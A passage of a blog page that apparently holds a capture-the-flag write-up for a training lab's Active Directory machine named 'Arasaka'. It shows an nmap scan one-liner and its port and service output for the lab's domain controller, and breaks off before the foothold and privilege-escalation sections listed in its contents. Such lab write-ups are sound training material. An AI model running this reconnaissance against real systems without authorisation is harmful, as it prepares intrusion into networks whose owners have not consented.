@@ -1,0 +1,1099 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="\n#\rSolution\r#\rFinding Credentials\rnmap shows SMB is open, but we don&rsquo;t get anywhere with any credentials. It also gives us the domain and FQDN.\n1 mkdir nmap &amp;&amp; sudo nmap -Pn -p- -vv &lt;your-box-ip&gt; -oN nmap/tcp-ports --min-rate 10000 &amp;&amp; ports=$(grep &#39;^[0-9]&#39; nmap/tcp-ports | cut -d &#39;/&#39; -f 1 | tr &#39;\\n&#39; &#39;,&#39; | sed s/,$//) &amp;&amp; sudo nmap -sCV -Pn -p $ports -vv &lt;your-box-ip&gt; -oA nmap/tcp-scripts-versions --min-rate 10000 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 126 Simple DNS Plus 88/tcp filtered kerberos-sec no-response 135/tcp open tcpwrapped syn-ack ttl 126 139/tcp filtered netbios-ssn no-response 389/tcp filtered ldap no-response 445/tcp open tcpwrapped syn-ack ttl 126 593/tcp open ncacn_http syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0 3268/tcp filtered globalcatLDAP no-response 3389/tcp open tcpwrapped syn-ack ttl 126 |_ssl-date: 2025-09-25T02:22:33+00:00; -2s from scanner time. | rdp-ntlm-info: | Target_Name: HACKSMARTER | NetBIOS_Domain_Name: HACKSMARTER | NetBIOS_Computer_Name: DC01 | DNS_Domain_Name: hacksmarter.local | DNS_Computer_Name: DC01.hacksmarter.local | Product_Version: 10.0.20348 |_ System_Time: 2025-09-25T02:21:32+00:00 | ssl-cert: Subject: commonName=DC01.hacksmarter.local | Issuer: commonName=DC01.hacksmarter.local | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2025-09-20T02:51:46 | Not valid after: 2026-03-22T02:51:46 | MD5: c15b:e7bf:300c:7994:c7c0:c1a5:2fcd:928c | SHA-1: 97ac:c4b4:fb84:3417:e8fb:e9b1:a5ae:4357:bb1f:12e9 | -----BEGIN CERTIFICATE----- | MIIC8DCCAdigAwIBAgIQN1NTSOO69Y5K973diAX2ITANBgkqhkiG9w0BAQsFADAh | MR8wHQYDVQQDExZEQzAxLmhhY2tzbWFydGVyLmxvY2FsMB4XDTI1MDkyMDAyNTE0 | NloXDTI2MDMyMjAyNTE0NlowITEfMB0GA1UEAxMWREMwMS5oYWNrc21hcnRlci5s | b2NhbDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALcO/no+r6u9RWZv | dKtmcvdUyPHST3C9uBPDm7vtdNuWXpWe4TGtDH2uFGq+m3aCy4qWrp74RkGSaYml | 03IgqSBgo4EK+636edSS8yavRyJINTtJBRstbWh45U7Li00KRdng2TQG5tWBq97r | lMnN2gMSJsOX1UgaDnf09pcsQn/6cDzHeWkPf64BjOYd2jHxul+0HWU03i4KLtNo | gpVENdAPxMKqPIQzZjKdoXu9zrhHRo6ayA3FBtF/UlOJp9ul+bMcv4V3morc4Kwi | Yyg1e4NBIikUteIxYjfVXZHdZnJr16Oe0U1QxR5fwZbhAX9fJ44ORxIzItcjQmJZ | yyV89VkCAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQw | MA0GCSqGSIb3DQEBCwUAA4IBAQCLf577kCMAmhyYLnbPBku9hgjRnaifcXM9Ydg9 | 4bdopKAMMmH0fo4Ot0Ito0J91151Ikdv42gQM7UM2nGuwSFFXvnDDuTqiRPC70e3 | Qrnxd4A2mEemsNGdpceiJQ2jZCeX6Qn7SZD0kV/aSXP2olGBzUTUqghlWN8wAnQb | TgSe7Fti2zQtqKvXfDAgqgKCoeKi38uAnWk3Yt7u600baJAv+mbk/VOkyB80L6tD | uAooN8gmXwZxxqZCYFR2veZXQ4mihPz+9Tt1ynfO+tepGe2UsYKQLaAcaFLlG5NX | lcqR+mD8m6CUR+UPFsBDYH1hHOHyRq51fk42yK8VFP7lC/Lz |_-----END CERTIFICATE----- 60236/tcp filtered unknown no-response Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: mean: -2s, deviation: 0s, median: -2s |_smb2-time: Protocol negotiation failed (SMB2) | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 34011/tcp): CLEAN (Timeout) | Check 2 (port 53964/tcp): CLEAN (Timeout) | Check 3 (port 57551/udp): CLEAN (Timeout) | Check 4 (port 48474/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked NSE: Script Post-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 21:22 Completed NSE at 21:22, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 21:22 Completed NSE at 21:22, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 21:22 Completed NSE at 21:22, 0.00s elapsed Read data files from: /usr/share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 72.69 seconds Raw packets sent: 15 (660B) | Rcvd: 5 (220B) We add the domain and FQDN to /etc/hosts.\n">
+<title>Arasaka</title>
+
+<link rel='canonical' href='https://pho3nix-jacki3.github.io/p/arasaka/'> 
+<link rel="stylesheet" href="/scss/style.min.616915be49a416c4056acbc7a6d4b6cbdb40dc55db1b3fba454464e563a84280.css" />
+<meta property='og:title' content="Arasaka">
+<meta property='og:description' content="\n#\rSolution\r#\rFinding Credentials\rnmap shows SMB is open, but we don&rsquo;t get anywhere with any credentials. It also gives us the domain and FQDN.\n1 mkdir nmap &amp;&amp; sudo nmap -Pn -p- -vv &lt;your-box-ip&gt; -oN nmap/tcp-ports --min-rate 10000 &amp;&amp; ports=$(grep &#39;^[0-9]&#39; nmap/tcp-ports | cut -d &#39;/&#39; -f 1 | tr &#39;\\n&#39; &#39;,&#39; | sed s/,$//) &amp;&amp; sudo nmap -sCV -Pn -p $ports -vv &lt;your-box-ip&gt; -oA nmap/tcp-scripts-versions --min-rate 10000 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 126 Simple DNS Plus 88/tcp filtered kerberos-sec no-response 135/tcp open tcpwrapped syn-ack ttl 126 139/tcp filtered netbios-ssn no-response 389/tcp filtered ldap no-response 445/tcp open tcpwrapped syn-ack ttl 126 593/tcp open ncacn_http syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0 3268/tcp filtered globalcatLDAP no-response 3389/tcp open tcpwrapped syn-ack ttl 126 |_ssl-date: 2025-09-25T02:22:33+00:00; -2s from scanner time. | rdp-ntlm-info: | Target_Name: HACKSMARTER | NetBIOS_Domain_Name: HACKSMARTER | NetBIOS_Computer_Name: DC01 | DNS_Domain_Name: hacksmarter.local | DNS_Computer_Name: DC01.hacksmarter.local | Product_Version: 10.0.20348 |_ System_Time: 2025-09-25T02:21:32+00:00 | ssl-cert: Subject: commonName=DC01.hacksmarter.local | Issuer: commonName=DC01.hacksmarter.local | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2025-09-20T02:51:46 | Not valid after: 2026-03-22T02:51:46 | MD5: c15b:e7bf:300c:7994:c7c0:c1a5:2fcd:928c | SHA-1: 97ac:c4b4:fb84:3417:e8fb:e9b1:a5ae:4357:bb1f:12e9 | -----BEGIN CERTIFICATE----- | MIIC8DCCAdigAwIBAgIQN1NTSOO69Y5K973diAX2ITANBgkqhkiG9w0BAQsFADAh | MR8wHQYDVQQDExZEQzAxLmhhY2tzbWFydGVyLmxvY2FsMB4XDTI1MDkyMDAyNTE0 | NloXDTI2MDMyMjAyNTE0NlowITEfMB0GA1UEAxMWREMwMS5oYWNrc21hcnRlci5s | b2NhbDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALcO/no+r6u9RWZv | dKtmcvdUyPHST3C9uBPDm7vtdNuWXpWe4TGtDH2uFGq+m3aCy4qWrp74RkGSaYml | 03IgqSBgo4EK+636edSS8yavRyJINTtJBRstbWh45U7Li00KRdng2TQG5tWBq97r | lMnN2gMSJsOX1UgaDnf09pcsQn/6cDzHeWkPf64BjOYd2jHxul+0HWU03i4KLtNo | gpVENdAPxMKqPIQzZjKdoXu9zrhHRo6ayA3FBtF/UlOJp9ul+bMcv4V3morc4Kwi | Yyg1e4NBIikUteIxYjfVXZHdZnJr16Oe0U1QxR5fwZbhAX9fJ44ORxIzItcjQmJZ | yyV89VkCAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQw | MA0GCSqGSIb3DQEBCwUAA4IBAQCLf577kCMAmhyYLnbPBku9hgjRnaifcXM9Ydg9 | 4bdopKAMMmH0fo4Ot0Ito0J91151Ikdv42gQM7UM2nGuwSFFXvnDDuTqiRPC70e3 | Qrnxd4A2mEemsNGdpceiJQ2jZCeX6Qn7SZD0kV/aSXP2olGBzUTUqghlWN8wAnQb | TgSe7Fti2zQtqKvXfDAgqgKCoeKi38uAnWk3Yt7u600baJAv+mbk/VOkyB80L6tD | uAooN8gmXwZxxqZCYFR2veZXQ4mihPz+9Tt1ynfO+tepGe2UsYKQLaAcaFLlG5NX | lcqR+mD8m6CUR+UPFsBDYH1hHOHyRq51fk42yK8VFP7lC/Lz |_-----END CERTIFICATE----- 60236/tcp filtered unknown no-response Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: mean: -2s, deviation: 0s, median: -2s |_smb2-time: Protocol negotiation failed (SMB2) | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 34011/tcp): CLEAN (Timeout) | Check 2 (port 53964/tcp): CLEAN (Timeout) | Check 3 (port 57551/udp): CLEAN (Timeout) | Check 4 (port 48474/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked NSE: Script Post-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 21:22 Completed NSE at 21:22, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 21:22 Completed NSE at 21:22, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 21:22 Completed NSE at 21:22, 0.00s elapsed Read data files from: /usr/share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 72.69 seconds Raw packets sent: 15 (660B) | Rcvd: 5 (220B) We add the domain and FQDN to /etc/hosts.\n">
+<meta property='og:url' content='https://pho3nix-jacki3.github.io/p/arasaka/'>
+<meta property='og:site_name' content='Blue Pho3nix'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Easy' /><meta property='article:tag' content='Active Directory' /><meta property='article:tag' content='OSCP Prep' /><meta property='og:image' content='https://pho3nix-jacki3.github.io/p/arasaka/img/hack-smarter.png' />
+<meta name="twitter:title" content="Arasaka">
+<meta name="twitter:description" content="\n#\rSolution\r#\rFinding Credentials\rnmap shows SMB is open, but we don&rsquo;t get anywhere with any credentials. It also gives us the domain and FQDN.\n1 mkdir nmap &amp;&amp; sudo nmap -Pn -p- -vv &lt;your-box-ip&gt; -oN nmap/tcp-ports --min-rate 10000 &amp;&amp; ports=$(grep &#39;^[0-9]&#39; nmap/tcp-ports | cut -d &#39;/&#39; -f 1 | tr &#39;\\n&#39; &#39;,&#39; | sed s/,$//) &amp;&amp; sudo nmap -sCV -Pn -p $ports -vv &lt;your-box-ip&gt; -oA nmap/tcp-scripts-versions --min-rate 10000 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 126 Simple DNS Plus 88/tcp filtered kerberos-sec no-response 135/tcp open tcpwrapped syn-ack ttl 126 139/tcp filtered netbios-ssn no-response 389/tcp filtered ldap no-response 445/tcp open tcpwrapped syn-ack ttl 126 593/tcp open ncacn_http syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0 3268/tcp filtered globalcatLDAP no-response 3389/tcp open tcpwrapped syn-ack ttl 126 |_ssl-date: 2025-09-25T02:22:33+00:00; -2s from scanner time. | rdp-ntlm-info: | Target_Name: HACKSMARTER | NetBIOS_Domain_Name: HACKSMARTER | NetBIOS_Computer_Name: DC01 | DNS_Domain_Name: hacksmarter.local | DNS_Computer_Name: DC01.hacksmarter.local | Product_Version: 10.0.20348 |_ System_Time: 2025-09-25T02:21:32+00:00 | ssl-cert: Subject: commonName=DC01.hacksmarter.local | Issuer: commonName=DC01.hacksmarter.local | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2025-09-20T02:51:46 | Not valid after: 2026-03-22T02:51:46 | MD5: c15b:e7bf:300c:7994:c7c0:c1a5:2fcd:928c | SHA-1: 97ac:c4b4:fb84:3417:e8fb:e9b1:a5ae:4357:bb1f:12e9 | -----BEGIN CERTIFICATE----- | MIIC8DCCAdigAwIBAgIQN1NTSOO69Y5K973diAX2ITANBgkqhkiG9w0BAQsFADAh | MR8wHQYDVQQDExZEQzAxLmhhY2tzbWFydGVyLmxvY2FsMB4XDTI1MDkyMDAyNTE0 | NloXDTI2MDMyMjAyNTE0NlowITEfMB0GA1UEAxMWREMwMS5oYWNrc21hcnRlci5s | b2NhbDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALcO/no+r6u9RWZv | dKtmcvdUyPHST3C9uBPDm7vtdNuWXpWe4TGtDH2uFGq+m3aCy4qWrp74RkGSaYml | 03IgqSBgo4EK+636edSS8yavRyJINTtJBRstbWh45U7Li00KRdng2TQG5tWBq97r | lMnN2gMSJsOX1UgaDnf09pcsQn/6cDzHeWkPf64BjOYd2jHxul+0HWU03i4KLtNo | gpVENdAPxMKqPIQzZjKdoXu9zrhHRo6ayA3FBtF/UlOJp9ul+bMcv4V3morc4Kwi | Yyg1e4NBIikUteIxYjfVXZHdZnJr16Oe0U1QxR5fwZbhAX9fJ44ORxIzItcjQmJZ | yyV89VkCAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQw | MA0GCSqGSIb3DQEBCwUAA4IBAQCLf577kCMAmhyYLnbPBku9hgjRnaifcXM9Ydg9 | 4bdopKAMMmH0fo4Ot0Ito0J91151Ikdv42gQM7UM2nGuwSFFXvnDDuTqiRPC70e3 | Qrnxd4A2mEemsNGdpceiJQ2jZCeX6Qn7SZD0kV/aSXP2olGBzUTUqghlWN8wAnQb | TgSe7Fti2zQtqKvXfDAgqgKCoeKi38uAnWk3Yt7u600baJAv+mbk/VOkyB80L6tD | uAooN8gmXwZxxqZCYFR2veZXQ4mihPz+9Tt1ynfO+tepGe2UsYKQLaAcaFLlG5NX | lcqR+mD8m6CUR+UPFsBDYH1hHOHyRq51fk42yK8VFP7lC/Lz |_-----END CERTIFICATE----- 60236/tcp filtered unknown no-response Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: mean: -2s, deviation: 0s, median: -2s |_smb2-time: Protocol negotiation failed (SMB2) | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 34011/tcp): CLEAN (Timeout) | Check 2 (port 53964/tcp): CLEAN (Timeout) | Check 3 (port 57551/udp): CLEAN (Timeout) | Check 4 (port 48474/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked NSE: Script Post-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 21:22 Completed NSE at 21:22, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 21:22 Completed NSE at 21:22, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 21:22 Completed NSE at 21:22, 0.00s elapsed Read data files from: /usr/share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 72.69 seconds Raw packets sent: 15 (660B) | Rcvd: 5 (220B) We add the domain and FQDN to /etc/hosts.\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://pho3nix-jacki3.github.io/p/arasaka/img/hack-smarter.png' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            localStorage.setItem(colorSchemeKey, "dark");
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_2f3062cb4e01dc1b.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🔥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Blue Pho3nix</a></h1>
+            <h2 class="site-description">Learn cool stuff</h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                
+                <span>Categories</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#finding-credentials">Finding Credentials</a></li>
+    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+    
+   
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/hack-smarter/" style="background-color: ; color: #000;">
+                Hack Smarter
+            </a>
+        
+        
+    <section class="article-tags">
+        
+            <a href="/tags/easy/">Easy</a>
+        
+            <a href="/tags/active-directory/">Active Directory</a>
+        
+            <a href="/tags/oscp-prep/">OSCP Prep</a>
+        
+    </section>
+
+
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/arasaka/">Arasaka</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    6 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+
+    <section class="article-content">
+    
+    
+    <p><img src="/p/arasaka/img/intro.png"
+	width="952"
+	height="531"
+	
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="179"
+		data-flex-basis="430px"
+	
+></p>
+<h1 id="solution">
+    <a href="#solution" class="header-anchor">#</a>
+    Solution
+</h1><h2 id="finding-credentials">
+    <a href="#finding-credentials" class="header-anchor">#</a>
+    Finding Credentials
+</h2><p><code>nmap</code> shows SMB is open, but we don&rsquo;t get anywhere with any credentials. It also gives us the domain and FQDN.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mkdir nmap &amp;&amp; sudo nmap -Pn -p- -vv &lt;your-box-ip&gt; -oN nmap/tcp-ports --min-rate 10000 &amp;&amp; ports=$(grep &#39;^[0-9]&#39; nmap/tcp-ports  | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) &amp;&amp; sudo nmap -sCV -Pn -p $ports -vv &lt;your-box-ip&gt; -oA nmap/tcp-scripts-versions --min-rate 10000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PORT      STATE    SERVICE       REASON          VERSION
+</span></span><span class="line"><span class="cl">53/tcp    open     domain        syn-ack ttl <span class="m">126</span> Simple DNS Plus
+</span></span><span class="line"><span class="cl">88/tcp    filtered kerberos-sec  no-response
+</span></span><span class="line"><span class="cl">135/tcp   open     tcpwrapped    syn-ack ttl <span class="m">126</span>
+</span></span><span class="line"><span class="cl">139/tcp   filtered netbios-ssn   no-response
+</span></span><span class="line"><span class="cl">389/tcp   filtered ldap          no-response
+</span></span><span class="line"><span class="cl">445/tcp   open     tcpwrapped    syn-ack ttl <span class="m">126</span>
+</span></span><span class="line"><span class="cl">593/tcp   open     ncacn_http    syn-ack ttl <span class="m">126</span> Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">3268/tcp  filtered globalcatLDAP no-response
+</span></span><span class="line"><span class="cl">3389/tcp  open     tcpwrapped    syn-ack ttl <span class="m">126</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2025-09-25T02:22:33+00:00<span class="p">;</span> -2s from scanner time.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> rdp-ntlm-info:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Target_Name: HACKSMARTER
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS_Domain_Name: HACKSMARTER
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS_Computer_Name: DC01
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Domain_Name: hacksmarter.local
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   DNS_Computer_Name: DC01.hacksmarter.local
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Product_Version: 10.0.20348
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  System_Time: 2025-09-25T02:21:32+00:00
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC01.hacksmarter.local
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>DC01.hacksmarter.local
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key type: rsa
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Public Key bits: <span class="m">2048</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Signature Algorithm: sha256WithRSAEncryption
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-09-20T02:51:46
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid after:  2026-03-22T02:51:46
+</span></span><span class="line"><span class="cl"><span class="p">|</span> MD5:   c15b:e7bf:300c:7994:c7c0:c1a5:2fcd:928c
